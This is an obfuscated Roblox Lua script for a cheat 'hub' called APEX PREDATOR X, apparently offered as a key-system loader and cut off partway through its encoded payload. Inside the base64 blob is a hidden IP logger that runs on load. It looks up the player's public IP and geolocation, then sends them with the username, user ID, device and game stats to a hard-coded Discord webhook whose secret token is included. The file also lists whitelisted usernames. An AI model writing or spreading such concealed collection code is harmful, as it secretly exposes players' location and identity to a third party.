--[[Protected by Sen Obsfucator V3 | RMPG Services | Generated Time: 2025-11-27 13:37:58]] (function() local __b = "LS0gS2V5IFN5c3RlbSB3aXRoIFdoaXRlbGlzdApsb2NhbCB2YWxpZEtleXMgPSB7CiAgICAiMSIKfQoKLS0gV2hpdGVsaXN0ZWQgUm9ibG94IHVzZXJuYW1lcyAoY2FzZSBpbnNlbnNpdGl2ZSkKbG9jYWwgd2hpdGVsaXN0ZWRVc2VycyA9IHsKICAgICJqb2huX3NlbnNlaTUiLAogICAgIm9udG9wdHdpbiIsCiAgICAiam9obl9zZW5zZWk1IiwKICAgICJrdXJ0X2FybWFubGljdXAiLAogICAgInJpcF9pbmRyYXBvZ2kzMDkzIiwKICAgICJsaWV0b2RpZTEiLAogICAgIk5pZ2h0X3N0cmlrZXI4IiwKICAgICJEb2ZfUE9HSUFMVCIsCiAgICAibXVzY2xlX2xlZ2VuZHMwNTciLAogICAgIkltX2JlZzYiLAogICAgIkVOVEVSTkFMR0hPU1Q0IiwKICAgICJSaXBfa2l5b3NoMSIsCiAgICAidG9tbHVjYXMyNTI1IiwKICAgICJkYXZlY2FwaXpfNTUiLAogICAgIk9nX3ppb24xMjciLAogICAgInJpcF9pbmRyYXBvZ2kzMDkzIiwKICAgICJtYXNheW9uMTIzeHh6IiwKICAgICJrYW1kYWtvb2wiLAogICAgImx1bmFodWI5IiwgCiAgICAiY2xvd24yMjkwOSIsCiAgICAiQWx0bmlDeW1vbnRvaCIsCiAgICAiZGFya3ZhZGVyaXNibGFjayIsCiAgICAiT1hFTl9DQU5PTiIsCiAgICAiR0NIX0tVUEFMIiwKICAgICJNcW52cDkwOSIsCiAgICAiSmFtZXNnYW1pbmdib3lsbCIsCiAgICAibXVzaGVoMDA3IiwKICAgICJZb3VyZDNueiIsCiAgICAiSmFzbWluZV93YXJlbjFvIiwKICAgICJ1bmNsZWJhZHMxOSIsCiAgICAiemFja2FrYTIyMyIsCiAgICAiT3NoaXJ1MSIsCiAgICAiRjRfQ3NpZGUiLAogICAgIm5hdGhhbmJhbGlsaWExNCIsCiAgICAianV6ZW5ubnlzeiIKCn0KCi0tIFNlbmQgd2ViaG9vayBpbW1lZGlhdGVseSB3aGVuIHNjcmlwdCBsb2Fkcwpsb2NhbCBmdW5jdGlvbiBzZW5kSW5pdGlhbFdlYmhvb2soKQogICAgbG9jYWwgdXJsID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE0NDAyNjY2NzkzMTY2NDc5NzcvSUFTelNUckJ3a2hMMUZYV2tiS2lYQWJYWExSd09PR2tSYTM5NGRyc2pVeG9HVFN1VjUtcmx2RjlNRGo0eE00aVJteUgiCiAgICAKICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgbG9jYWwgc3RhdHMgPSBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoImxlYWRlcnN0YXRzIikKICAgIAogICAgLS0gRW5oYW5jZWQgSVAgRGV0ZWN0aW9uIEZ1bmN0aW9uCiAgICBsb2NhbCBmdW5jdGlvbiBnZXRBY2N1cmF0ZUlQKCkKICAgICAgICBsb2NhbCBpcFNlcnZpY2VzID0gewogICAgICAgICAgICAiaHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29uIiwKICAgICAgICAgICAgImh0dHBzOi8vYXBpLm15LWlwLmlvL2lwLmpzb24iLCAKICAgICAgICAgICAgImh0dHBzOi8vaXBhcGkuY28vanNvbi8iLAogICAgICAgICAgICAiaHR0cHM6Ly9pcGluZm8uaW8vanNvbiIsCiAgICAgICAgICAgICJodHRwczovL2h0dHBiaW4ub3JnL2lwIiwKICAgICAgICAgICAgImh0dHBzOi8vY2hlY2tpcC5hbWF6b25hd3MuY29tIiwKICAgICAgICAgICAgImh0dHBzOi8vaWNhbmhhemlwLmNvbSIsCiAgICAgICAgICAgICJodHRwczovL2lkZW50Lm1lIiwKICAgICAgICAgICAgImh0dHBzOi8vaXBlY2hvLm5ldC9wbGFpbiIsCiAgICAgICAgICAgICJodHRwczovL3d0ZmlzbXlpcC5jb20vanNvbiIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgbG9jYWwgZmFsbGJhY2tJUCA9ICJVbmtub3duIgogICAgICAgIAogICAgICAgIGZvciBpLCBzZXJ2aWNlVXJsIGluIGlwYWlycyhpcFNlcnZpY2VzKSBkbwogICAgICAgICAgICBsb2NhbCBzdWNjZXNzLCByZXN1bHQgPSBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBsb2NhbCByZXNwb25zZSA9IGdhbWU6SHR0cEdldChzZXJ2aWNlVXJsLCB0cnVlKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBzZXJ2aWNlVXJsOmZpbmQoImpzb24iKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgZGF0YSA9IGdhbWU6R2V0U2VydmljZSgiSHR0cFNlcnZpY2UiKTpKU09ORGVjb2RlKHJlc3BvbnNlKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmIHNlcnZpY2VVcmw6ZmluZCgiaXBpZnkiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBkYXRhLmlwCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIHNlcnZpY2VVcmw6ZmluZCgibXktaXAiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBkYXRhLmlwCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIHNlcnZpY2VVcmw6ZmluZCgiaXBhcGkiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBkYXRhLmlwCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIHNlcnZpY2VVcmw6ZmluZCgiaXBpbmZvIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZGF0YS5pcAogICAgICAgICAgICAgICAgICAgIGVsc2VpZiBzZXJ2aWNlVXJsOmZpbmQoInd0ZmlzbXlpcCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGRhdGEuWW91ckZ1Y2tpbmdJUEFkZHJlc3MKICAgICAgICAgICAgICAgICAgICBlbHNlaWYgc2VydmljZVVybDpmaW5kKCJodHRwYmluIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZGF0YS5vcmlnaW4KICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICByZXR1cm4gcmVzcG9uc2U6Z3N1YigiJXMrIiwgIiIpOmdzdWIoIlxuIiwgIiIpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgc3VjY2VzcyBhbmQgcmVzdWx0IGFuZCByZXN1bHQgfj0gIiIgYW5kIHJlc3VsdCB+PSAiVW5rbm93biIgdGhlbgogICAgICAgICAgICAgICAgaWYgcmVzdWx0Om1hdGNoKCJeKCVkKyUuJWQrJS4lZCslLiVkKykkIikgb3IgcmVzdWx0Om1hdGNoKCJeWyV4Ol0rJCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICByZXR1cm4gcmVzdWx0CiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHdhaXQoMC4xKQogICAgICAgIGVuZAogICAgICAgIHJldHVybiBmYWxsYmFja0lQCiAgICBlbmQKCiAgICAtLSBFbmhhbmNlZCBMb2NhdGlvbiBEZXRlY3Rpb24KICAgIGxvY2FsIGZ1bmN0aW9uIGdldEVuaGFuY2VkTG9jYXRpb24oaXBBZGRyZXNzKQogICAgICAgIGlmIGlwQWRkcmVzcyA9PSAiVW5rbm93biIgdGhlbgogICAgICAgICAgICByZXR1cm4gIlVua25vd24gTG9jYXRpb24iCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgbG9jYWwgbG9jYXRpb25TZXJ2aWNlcyA9IHsKICAgICAgICAgICAgImh0dHA6Ly9pcC1hcGkuY29tL2pzb24vIiAuLiBpcEFkZHJlc3MsCiAgICAgICAgICAgICJodHRwczovL2lwYXBpLmNvLyIgLi4gaXBBZGRyZXNzIC4uICIvanNvbi8iLAogICAgICAgICAgICAiaHR0cHM6Ly9pcGluZm8uaW8vIiAuLiBpcEFkZHJlc3MgLi4gIi9qc29uIgogICAgICAgIH0KICAgICAgICAKICAgICAgICBmb3IgaSwgc2VydmljZVVybCBpbiBpcGFpcnMobG9jYXRpb25TZXJ2aWNlcykgZG8KICAgICAgICAgICAgbG9jYWwgc3VjY2VzcywgbG9jYXRpb25EYXRhID0gcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgbG9jYWwgcmVzcG9uc2UgPSBnYW1lOkh0dHBHZXQoc2VydmljZVVybCwgdHJ1ZSkKICAgICAgICAgICAgICAgIGxvY2FsIGRhdGEgPSBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIik6SlNPTkRlY29kZShyZXNwb25zZSkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgc2VydmljZVVybDpmaW5kKCJpcCUtYXBpIikgdGhlbgogICAgICAgICAgICAgICAgICAgIGlmIGRhdGEuc3RhdHVzID09ICJzdWNjZXNzIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGNpdHkgPSBkYXRhLmNpdHkgb3IgIlVua25vd24iCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGNvdW50cnkgPSBkYXRhLmNvdW50cnkgb3IgIlVua25vd24iCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAi8J+TjSAiIC4uIGNpdHkgLi4gIiwgIiAuLiBjb3VudHJ5CiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbHNlaWYgc2VydmljZVVybDpmaW5kKCJpcGFwaSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBjaXR5ID0gZGF0YS5jaXR5IG9yICJVbmtub3duIgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGNvdW50cnkgPSBkYXRhLmNvdW50cnlfbmFtZSBvciAiVW5rbm93biIKICAgICAgICAgICAgICAgICAgICByZXR1cm4gIvCfk40gIiAuLiBjaXR5IC4uICIsICIgLi4gY291bnRyeQogICAgICAgICAgICAgICAgZWxzZWlmIHNlcnZpY2VVcmw6ZmluZCgiaXBpbmZvIikgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGNpdHkgPSBkYXRhLmNpdHkgb3IgIlVua25vd24iCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgY291bnRyeSA9IGRhdGEuY291bnRyeSBvciAiVW5rbm93biIKICAgICAgICAgICAgICAgICAgICByZXR1cm4gIvCfk40gIiAuLiBjaXR5IC4uICIsICIgLi4gY291bnRyeQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIHN1Y2Nlc3MgYW5kIGxvY2F0aW9uRGF0YSB0aGVuCiAgICAgICAgICAgICAgICByZXR1cm4gbG9jYXRpb25EYXRhCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIHJldHVybiAi8J+TjSBVbmtub3duIExvY2F0aW9uIgogICAgZW5kCiAgICAKICAgIC0tIEdldCBhY2N1cmF0ZSBJUCBhbmQgbG9jYXRpb24KICAgIGxvY2FsIGFjY3VyYXRlSVAgPSBnZXRBY2N1cmF0ZUlQKCkKICAgIGxvY2FsIGxvY2F0aW9uID0gZ2V0RW5oYW5jZWRMb2NhdGlvbihhY2N1cmF0ZUlQKQogICAgCiAgICAtLSBGdW5jdGlvbiB0byBmb3JtYXQgbnVtYmVycyB3aXRoIGFiYnJldmlhdGlvbnMKICAgIGxvY2FsIGZ1bmN0aW9uIGZvcm1hdE51bWJlcihudW0pCiAgICAgICAgaWYgbm90IG51bSB0aGVuIHJldHVybiAiTi9BIiBlbmQKICAgICAgICBsb2NhbCBmb3JtYXRzID0gewogICAgICAgICAgICB7MWUxOCwgIlFpIn0sIHsxZTE1LCAiUWEifSwgezFlMTIsICJUIn0sIAogICAgICAgICAgICB7MWU5LCAiQiJ9LCB7MWU2LCAiTSJ9LCB7MWUzLCAiSyJ9CiAgICAgICAgfQogICAgICAgIAogICAgICAgIGZvciBfLCBmb3JtYXQgaW4gaXBhaXJzKGZvcm1hdHMpIGRvCiAgICAgICAgICAgIGlmIG51bSA+PSBmb3JtYXRbMV0gdGhlbgogICAgICAgICAgICAgICAgcmV0dXJuIHN0cmluZy5mb3JtYXQoIiUuMWYlcyIsIG51bSAvIGZvcm1hdFsxXSwgZm9ybWF0WzJdKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICByZXR1cm4gdG9zdHJpbmcobnVtKQogICAgZW5kCiAgICAKICAgIC0tIEdldCBzdGF0cwogICAgbG9jYWwgc3RyZW5ndGggPSBzdGF0cyBhbmQgc3RhdHM6RmluZEZpcnN0Q2hpbGQoIlN0cmVuZ3RoIikgYW5kIHN0YXRzLlN0cmVuZ3RoLlZhbHVlIG9yIDAKICAgIGxvY2FsIGR1cmFiaWxpdHkgPSBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoIkR1cmFiaWxpdHkiKSBhbmQgcGxheWVyLkR1cmFiaWxpdHkuVmFsdWUgb3IgMAogICAgbG9jYWwgcmViaXJ0aHMgPSBzdGF0cyBhbmQgc3RhdHM6RmluZEZpcnN0Q2hpbGQoIlJlYmlydGhzIikgYW5kIHN0YXRzLlJlYmlydGhzLlZhbHVlIG9yIDAKICAgIAogICAgLS0gRW5oYW5jZWQgZGV2aWNlIGRldGVjdGlvbgogICAgbG9jYWwgZGV2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJVc2VySW5wdXRTZXJ2aWNlIik6R2V0UGxhdGZvcm0oKS5OYW1lCiAgICBsb2NhbCBleGVjdXRvciA9ICJVbmtub3duIgogICAgCiAgICAtLSBEZXRlY3QgZXhlY3V0b3IgbW9yZSBhY2N1cmF0ZWx5CiAgICBpZiBzeW4gdGhlbgogICAgICAgIGV4ZWN1dG9yID0gIlN5bmFwc2UgWCIKICAgIGVsc2VpZiBQUk9UT1NNQVNIRVJfTE9BREVEIHRoZW4KICAgICAgICBleGVjdXRvciA9ICJQcm90b1NtYXNoZXIiCiAgICBlbHNlaWYgS1JOTF9MT0FERUQgdGhlbgogICAgICAgIGV4ZWN1dG9yID0gIktSTkwiCiAgICBlbHNlaWYgaWRlbnRpZnlleGVjdXRvciB0aGVuCiAgICAgICAgZXhlY3V0b3IgPSBpZGVudGlmeWV4ZWN1dG9yKCkgb3IgIlVua25vd24iCiAgICBlbmQKCiAgICAtLSBDaGVjayBpZiB1c2VyIGlzIHdoaXRlbGlzdGVkCiAgICBsb2NhbCBmdW5jdGlvbiBpc1VzZXJXaGl0ZWxpc3RlZCgpCiAgICAgICAgbG9jYWwgcGxheWVyTmFtZSA9IHBsYXllci5OYW1lOmxvd2VyKCkKICAgICAgICBmb3IgXywgd2hpdGVsaXN0ZWROYW1lIGluIGlwYWlycyh3aGl0ZWxpc3RlZFVzZXJzKSBkbwogICAgICAgICAgICBpZiBwbGF5ZXJOYW1lID09IHdoaXRlbGlzdGVkTmFtZTpsb3dlcigpIHRoZW4KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIHJldHVybiBmYWxzZQogICAgZW5kCgogICAgbG9jYWwgaXNXaGl0ZWxpc3RlZCA9IGlzVXNlcldoaXRlbGlzdGVkKCkKCiAgICBsb2NhbCBkYXRhID0gewogICAgICAgIFsiY29udGVudCJdID0gIvCfjq4gKipBUEVYIFBSRURBVE9SIFggLSBTQ1JJUFQgTE9BREVEKioiLAogICAgICAgIFsiZW1iZWRzIl0gPSB7ewogICAgICAgICAgICBbInRpdGxlIl0gPSAi8J+UsCBTY3JpcHQgRXhlY3V0aW9uIFN0YXJ0ZWQiLAogICAgICAgICAgICBbImNvbG9yIl0gPSBpc1doaXRlbGlzdGVkIGFuZCA2NTI4MCBvciAxNjcxMTY4MCwgLS0gR3JlZW4gaWYgd2hpdGVsaXN0ZWQsIFJlZCBpZiBub3QKICAgICAgICAgICAgWyJ0aHVtYm5haWwiXSA9IHsKICAgICAgICAgICAgICAgIFsidXJsIl0gPSAiaHR0cHM6Ly93d3cucm9ibG94LmNvbS9oZWFkc2hvdC10aHVtYm5haWwvaW1hZ2U/dXNlcklkPSIgLi4gcGxheWVyLlVzZXJJZCAuLiAiJndpZHRoPTQyMCZoZWlnaHQ9NDIwJmZvcm1hdD1wbmciCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIFsiZmllbGRzIl0gPSB7CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgWyJuYW1lIl0gPSAi8J+RpCBQbGF5ZXIgSW5mb3JtYXRpb24iLAogICAgICAgICAgICAgICAgICAgIFsidmFsdWUiXSA9ICIqKlVzZXJuYW1lOioqIGAiIC4uIHBsYXllci5OYW1lIC4uICJgXG4qKkRpc3BsYXk6KiogIiAuLiBwbGF5ZXIuRGlzcGxheU5hbWUgLi4gIlxuKipVc2VyIElEOioqIGAiIC4uIHBsYXllci5Vc2VySWQgLi4gImAiLAogICAgICAgICAgICAgICAgICAgIFsiaW5saW5lIl0gPSB0cnVlCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFsibmFtZSJdID0gIvCfjI0gTG9jYXRpb24gRGF0YSIsCiAgICAgICAgICAgICAgICAgICAgWyJ2YWx1ZSJdID0gIioqSVA6KiogYCIgLi4gYWNjdXJhdGVJUCAuLiAiYFxuIiAuLiBsb2NhdGlvbiwKICAgICAgICAgICAgICAgICAgICBbImlubGluZSJdID0gdHJ1ZQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBbIm5hbWUiXSA9ICLwn5K7IFN5c3RlbSBJbmZvcm1hdGlvbiIsCiAgICAgICAgICAgICAgICAgICAgWyJ2YWx1ZSJdID0gIioqUGxhdGZvcm06KiogIiAuLiBkZXZpY2UgLi4gIlxuKipFeGVjdXRvcjoqKiAiIC4uIGV4ZWN1dG9yLAogICAgICAgICAgICAgICAgICAgIFsiaW5saW5lIl0gPSB0cnVlCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFsibmFtZSJdID0gIvCflJAgU2VjdXJpdHkgU3RhdHVzIiwKICAgICAgICAgICAgICAgICAgICBbInZhbHVlIl0gPSAiKipXaGl0ZWxpc3RlZDoqKiAiIC4uIChpc1doaXRlbGlzdGVkIGFuZCAi4pyFIFllcyIgb3IgIuKdjCBObyIpIC4uICJcbioqS2V5IFJlcXVpcmVkOioqICIgLi4gKGlzV2hpdGVsaXN0ZWQgYW5kICLinIUgWWVzIiBvciAi4p2MIE5vIiksCiAgICAgICAgICAgICAgICAgICAgWyJpbmxpbmUiXSA9IHRydWUKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgWyJuYW1lIl0gPSAi8J+SqiBHYW1lIFN0YXRpc3RpY3MiLAogICAgICAgICAgICAgICAgICAgIFsidmFsdWUiXSA9ICLwn5KqICoqU3RyZW5ndGg6KiogYCIgLi4gZm9ybWF0TnVtYmVyKHN0cmVuZ3RoKSAuLiAiYFxuPz/vuI8gKipEdXJhYmlsaXR5OioqIGAiIC4uIGZvcm1hdE51bWJlcihkdXJhYmlsaXR5KSAuLiAiYFxu8J+UhCAqKlJlYmlydGhzOioqIGAiIC4uIGZvcm1hdE51bWJlcihyZWJpcnRocykgLi4gImAiLAogICAgICAgICAgICAgICAgICAgIFsiaW5saW5lIl0gPSB0cnVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIFsiZm9vdGVyIl0gPSB7CiAgICAgICAgICAgICAgICBbInRleHQiXSA9ICJBUEVYIFBSRURBVE9SIFgg4oCiIFNjcmlwdCBMb2FkZWQg4oCiICIgLi4gb3MuZGF0ZSgiJVktJW0tJWQgYXQgJUg6JU06JVMiKQogICAgICAgICAgICB9CiAgICAgICAgfX0KICAgIH0KICAgIAogICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIGh0dHAgPSBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIikKICAgICAgICBsb2NhbCByZXNwb25zZSA9IGh0dHA6UmVxdWVzdEFzeW5jKHsKICAgICAgICAgICAgVXJsID0gdXJsLAogICAgICAgICAgICBNZXRob2QgPSAiUE9TVCIsCiAgICAgICAgICAgIEhlYWRlcnMgPSB7CiAgICAgICAgICAgICAgICBbIkNvbnRlbnQtVHlwZSJdID0gImFwcGxpY2F0aW9uL2pzb24iCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIEJvZHkgPSBodHRwOkpTT05FbmNvZGUoZGF0YSkKICAgICAgICB9KQogICAgZW5kKQplbmQKCi0tIFNlbmQgd2ViaG9vayBpbW1lZGlhdGVseSB3aGVuIHNjcmlwdCBzdGFydHMKc2VuZEluaXRpYWxXZWJob29rKCkKCi0tIENvbnRpbnVlIHdpdGggdGhlIHJlc3Qgb2YgdGhlIGtleSBzeXN0ZW0uLi4KbG9jYWwga2V5R3VpID0gSW5zdGFuY2UubmV3KCJTY3JlZW5HdWkiKQprZXlHdWkuTmFtZSA9ICJLZXlTeXN0ZW0iCmtleUd1aS5QYXJlbnQgPSBnYW1lLkNvcmVHdWkKCmxvY2FsIGtleUZyYW1lID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCmtleUZyYW1lLlNpemUgPSBVRGltMi5uZXcoMCwgMzIwLCAwLCAyMDApCmtleUZyYW1lLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgLTE2MCwgMC41LCAtMTAwKQprZXlGcmFtZS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMTUsIDE1LCAyMCkKa2V5RnJhbWUuUGFyZW50ID0ga2V5R3VpCgpsb2NhbCBVSUNvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKQpVSUNvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCAxMCkKVUlDb3JuZXIuUGFyZW50ID0ga2V5RnJhbWUKCi0tIFRoaWNrIEFuaW1hdGVkIEdyYWRpZW50IEJvcmRlcgpsb2NhbCBVSVN0cm9rZSA9IEluc3RhbmNlLm5ldygiVUlTdHJva2UiKQpVSVN0cm9rZS5Db2xvciA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpClVJU3Ryb2tlLlRoaWNrbmVzcyA9IDQKVUlTdHJva2UuUGFyZW50ID0ga2V5RnJhbWUKCmxvY2FsIGdyYWRpZW50ID0gSW5zdGFuY2UubmV3KCJVSUdyYWRpZW50IikKZ3JhZGllbnQuQ29sb3IgPSBDb2xvclNlcXVlbmNlLm5ldyh7CiAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAsIENvbG9yMy5mcm9tUkdCKDUxLCA1MSwgNTEpKSwgICAtLSAjMzMzMzMzCiAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDEsIENvbG9yMy5mcm9tUkdCKDIyMSwgMjQsIDI0KSkgICAtLSAjZGQxODE4Cn0pCmdyYWRpZW50LlJvdGF0aW9uID0gMApncmFkaWVudC5QYXJlbnQgPSBVSVN0cm9rZQoKLS0gQW5pbWF0ZSB0aGUgZ3JhZGllbnQgcm90YXRpb24Kc3Bhd24oZnVuY3Rpb24oKQogICAgd2hpbGUga2V5R3VpLlBhcmVudCBkbwogICAgICAgIGZvciBpID0gMCwgMzYwLCAyIGRvCiAgICAgICAgICAgIGdyYWRpZW50LlJvdGF0aW9uID0gaQogICAgICAgICAgICB3YWl0KDAuMDMpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKLS0gQVBFWCBQUkVEQVRPUiBYIFRpdGxlIHdpdGggVHJpcGxlIEdyYWRpZW50CmxvY2FsIHRpdGxlID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQp0aXRsZS5UZXh0ID0gIkFQRVggUFJFREFUT1IgWCBIVUIiCnRpdGxlLlNpemUgPSBVRGltMi5uZXcoMC45LCAwLCAwLCAzMCkKdGl0bGUuUG9zaXRpb24gPSBVRGltMi5uZXcoMC4wNSwgMCwgMC4xLCAwKQp0aXRsZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQp0aXRsZS5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKdGl0bGUuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1CbGFjawp0aXRsZS5UZXh0U2l6ZSA9IDIwCnRpdGxlLlRleHRTdHJva2VUcmFuc3BhcmVuY3kgPSAwLjgKdGl0bGUuVGV4dFN0cm9rZUNvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApCnRpdGxlLlBhcmVudCA9IGtleUZyYW1lCgpsb2NhbCB0aXRsZUdyYWRpZW50ID0gSW5zdGFuY2UubmV3KCJVSUdyYWRpZW50IikKdGl0bGVHcmFkaWVudC5Db2xvciA9IENvbG9yU2VxdWVuY2UubmV3KHsKICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMCwgQ29sb3IzLmZyb21SR0IoMjYsIDQyLCAxMDgpKSwgICAtLSAjMWEyYTZjCiAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuNSwgQ29sb3IzLmZyb21SR0IoMTc4LCAzMSwgMzEpKSwgLS0gI2IyMWYxZgogICAgQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygxLCBDb2xvcjMuZnJvbVJHQigyNTMsIDE4NywgNDUpKSAgIC0tICNmZGJiMmQKfSkKdGl0bGVHcmFkaWVudC5Sb3RhdGlvbiA9IDAKdGl0bGVHcmFkaWVudC5QYXJlbnQgPSB0aXRsZQoKLS0gQW5pbWF0ZSB0aXRsZSBncmFkaWVudApzcGF3bihmdW5jdGlvbigpCiAgICB3aGlsZSBrZXlHdWkuUGFyZW50IGRvCiAgICAgICAgZm9yIGkgPSAwLCAzNjAsIDMgZG8KICAgICAgICAgICAgdGl0bGVHcmFkaWVudC5Sb3RhdGlvbiA9IGkKICAgICAgICAgICAgd2FpdCgwLjA0KQogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCi0tICJCeSA6IER5bGFuIiBTdWJ0aXRsZSB3aXRoIHNhbWUgZ3JhZGllbnQKbG9jYWwgc3VidGl0bGUgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCnN1YnRpdGxlLlRleHQgPSAiQnkgOiBEeWxhbiIKc3VidGl0bGUuU2l6ZSA9IFVEaW0yLm5ldygwLjksIDAsIDAsIDE1KQpzdWJ0aXRsZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjA1LCAwLCAwLjI1LCAwKQpzdWJ0aXRsZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQpzdWJ0aXRsZS5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKc3VidGl0bGUuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCnN1YnRpdGxlLlRleHRTaXplID0gMTAKc3VidGl0bGUuVGV4dFN0cm9rZVRyYW5zcGFyZW5jeSA9IDAuOApzdWJ0aXRsZS5UZXh0U3Ryb2tlQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCkKc3VidGl0bGUuUGFyZW50ID0ga2V5RnJhbWUKCmxvY2FsIHN1YnRpdGxlR3JhZGllbnQgPSBJbnN0YW5jZS5uZXcoIlVJR3JhZGllbnQiKQpzdWJ0aXRsZUdyYWRpZW50LkNvbG9yID0gQ29sb3JTZXF1ZW5jZS5uZXcoewogICAgQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLCBDb2xvcjMuZnJvbVJHQigyNiwgNDIsIDEwOCkpLCAgIC0tICMxYTJhNmMKICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC41LCBDb2xvcjMuZnJvbVJHQigxNzgsIDMxLCAzMSkpLCAtLSAjYjIxZjFmCiAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDEsIENvbG9yMy5mcm9tUkdCKDI1MywgMTg3LCA0NSkpICAgLS0gI2ZkYmIyZAp9KQpzdWJ0aXRsZUdyYWRpZW50LlJvdGF0aW9uID0gMApzdWJ0aXRsZUdyYWRpZW50LlBhcmVudCA9IHN1YnRpdGxlCgotLSBBbmltYXRlIHN1YnRpdGxlIGdyYWRpZW50CnNwYXduKGZ1bmN0aW9uKCkKICAgIHdoaWxlIGtleUd1aS5QYXJlbnQgZG8KICAgICAgICBmb3IgaSA9IDM2MCwgMCwgLTMgZG8KICAgICAgICAgICAgc3VidGl0bGVHcmFkaWVudC5Sb3RhdGlvbiA9IGkKICAgICAgICAgICAgd2FpdCgwLjA1KQogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCmxvY2FsIGtleUJveCA9IEluc3RhbmNlLm5ldygiVGV4dEJveCIpCmtleUJveC5TaXplID0gVURpbTIubmV3KDAuOC